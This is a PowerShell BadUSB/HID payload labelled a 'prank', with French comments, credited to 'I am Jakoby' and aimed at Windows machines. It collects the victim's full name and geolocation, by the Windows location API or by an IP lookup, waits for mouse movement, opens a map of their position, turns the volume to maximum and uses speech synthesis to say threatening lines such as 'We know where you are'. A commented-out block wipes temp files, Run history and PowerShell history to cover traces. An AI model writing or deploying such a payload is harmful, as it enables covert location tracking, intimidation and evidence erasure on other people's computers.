############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : We-Found-You      | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.NOTES
    Les services de localisation doivent être activés ou cette charge utile ne fonctionnera pas

.SYNOPSIS
    Ce script récupère la localisation de l'utilisateur, ouvre une carte de sa position dans le navigateur et utilise la synthèse vocale pour déclarer que vous savez où il se trouve
#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {
    try {
        $fullName = (Net User $Env:username | Select-String -Pattern "Full Name").ToString()
        $fullName = $fullName -replace "Full Name", "" -replace "\s+", " "
        return $fullName.Trim()
    }
    catch {
        Write-Error "Aucun nom détecté"
        return $env:UserName
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation {
    try {
        # Méthode 1 : Via l'API Windows
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        
        # Attendre la localisation (max 10 secondes)
        $timeout = 10
        $counter = 0
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($counter -lt $timeout)) {
            Start-Sleep -Milliseconds 1000
            $counter++
        }
        
        if ($GeoWatcher.Permission -eq 'Denied') {
            throw "Accès refusé aux informations de localisation"
        }
        elseif ($GeoWatcher.Status -eq 'Ready') {
            $location = $GeoWatcher.Position.Location
            return @{
                Latitude = $location.Latitude
                Longitude = $location.Longitude
            }
        }
        else {
            throw "Impossible d'obtenir la localisation"
        }
    }
    catch {
        Write-Warning "Échec de la géolocalisation : $($_.Exception.Message)"
        
        # Méthode alternative : Via IP publique (moins précise)
        try {
            Write-Host "Tentative de géolocalisation via IP..."
            $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
            if ($ipInfo.loc) {
                $coords = $ipInfo.loc -split ","
                return @{
                    Latitude = $coords[0]
                    Longitude = $coords[1]
                }
            }
        }
        catch {
            Write-Error "Échec de toutes les méthodes de géolocalisation"
            return $null
        }
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while ($true) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Exécution principale
try {
    # Obtenir le nom complet
    $FN = Get-fullName
    Write-Host "Nom détecté : $FN"

    # Obtenir la localisation
    $GL = Get-GeoLocation
    
    if ($GL -ne $null) {
        $Lat = $GL.Latitude
        $Lon = $GL.Longitude
        
        Write-Host "Coordonnées obtenues : Lat=$Lat, Lon=$Lon"
        
        # Attendre le mouvement de souris
        Write-Host "En attente d'un mouvement de souris..."
        Pause-Script

        # Ouvrir la carte
        $mapUrl = "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
        Write-Host "Ouverture de : $mapUrl"
        Start-Process $mapUrl

        Start-Sleep -Seconds 3

        # Régler le volume au maximum
        $k = [Math]::Ceiling(100/2)
        $o = New-Object -ComObject WScript.Shell
        for($i = 0; $i -lt $k; $i++) {
            $o.SendKeys([char] 175)
        }

        # Synthèse vocale
        try {
            $s = New-Object -ComObject SAPI.SpVoice
            $s.Rate = -2
            $s.Speak("We found you $FN")
            $s.Speak("We know where you are")
            $s.Speak("We are everywhere")
            $s.Speak("Expect us")
        }
        catch {
            Write-Warning "La synthèse vocale a échoué : $($_.Exception.Message)"
        }
    }
    else {
        Write-Error "Impossible d'obtenir la localisation"
    }
}
catch {
    Write-Error "Erreur lors de l'exécution : $($_.Exception.Message)"
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Nettoyage (optionnel - décommentez si nécessaire)
<#
try {
    # Supprimer le contenu du dossier Temp
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Supprimer l'historage de la boîte Exécuter
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null
    
    # Supprimer l'historique PowerShell
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
    }
    
    # Vider la corbeille
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Warning "Certaines opérations de nettoyage ont échoué"
}
#>

Write-Host "Script terminé"